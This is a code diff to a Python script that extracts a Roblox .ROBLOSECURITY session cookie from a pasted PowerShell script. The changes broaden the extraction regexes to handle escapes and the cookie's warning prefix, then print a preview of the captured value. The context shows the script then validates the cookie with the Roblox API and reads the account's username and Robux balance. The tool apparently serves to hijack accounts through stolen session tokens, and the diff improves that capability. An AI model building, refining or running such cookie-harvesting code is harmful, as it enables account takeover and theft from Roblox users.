@@ -26,10 +26,10 @@ def main():
         id_match = re.search(r'/(\d+)/|id=(\d+)', target_url)
         asset_id = id_match.group(1) or id_match.group(2) if id_match else "126531364524013"
 
-        # 2. Extract .ROBLOSECURITY Cookie
-        cookie_match = re.search(r'\.ROBLOSECURITY=([^;\'"\s]+)', decoded_script, re.IGNORECASE)
+        # 2. Robust .ROBLOSECURITY Cookie Extraction (Handles PowerShell escapes and warning prefix)
+        cookie_match = re.search(r'\.ROBLOSECURITY\s*=\s*["\']?(_\|WARNING:[^"\'\s;]+|[A-Za-z0-9_\-\.%\|]+)["\']?', decoded_script, re.IGNORECASE)
         if not cookie_match:
-            cookie_match = re.search(r'\.ROBLOSECURITY["\']\s*,\s*["\']([^"\']+)["\']', decoded_script, re.IGNORECASE)
+            cookie_match = re.search(r'\.ROBLOSECURITY["\']?\s*,\s*["\']?(_\|WARNING:[^"\'\s;]+|[A-Za-z0-9_\-\.%\|]+)["\']?', decoded_script, re.IGNORECASE)
             
         roblosecurity = cookie_match.group(1) if cookie_match else None
 
@@ -37,7 +37,9 @@ def main():
             print("ERROR: Could not find .ROBLOSECURITY cookie in the pasted PowerShell script.")
             return
 
-        print(f"[+] Cookie successfully extracted. Validating with Roblox API...")
+        # Unescape any PowerShell/JSON escape characters if present
+        roblosecurity = roblosecurity.replace('\\|', '|').strip()
+        print(f"[+] Cookie extracted successfully! Preview: {roblosecurity[:30]}... (Length: {len(roblosecurity)})")
 
         username = "Unknown User"
         robux_balance = 0
